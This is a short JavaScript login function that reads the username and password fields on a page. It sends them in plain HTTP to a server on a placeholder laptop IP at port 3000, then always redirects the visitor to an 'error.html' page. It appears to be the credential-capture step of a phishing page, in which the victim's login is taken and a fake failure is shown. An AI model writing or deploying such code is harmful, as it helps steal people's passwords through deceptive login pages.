
function login() {
    const username = document.getElementById("username").value;
    const password = document.getElementById("password").value;

    fetch("http://YOUR_LAPTOP_IP:3000/login", {  // Replace YOUR_LAPTOP_IP with your actual IP
        method: "POST",
        headers: {
            "Content-Type": "application/json"
        },
        body: JSON.stringify({ username, password })
    })
    .then(response => response.json())
    .then(data => {
        console.log(data);
        window.location.href = "error.html"; // Redirect to error page
    })
    .catch(error => console.error("Error:", error));
}
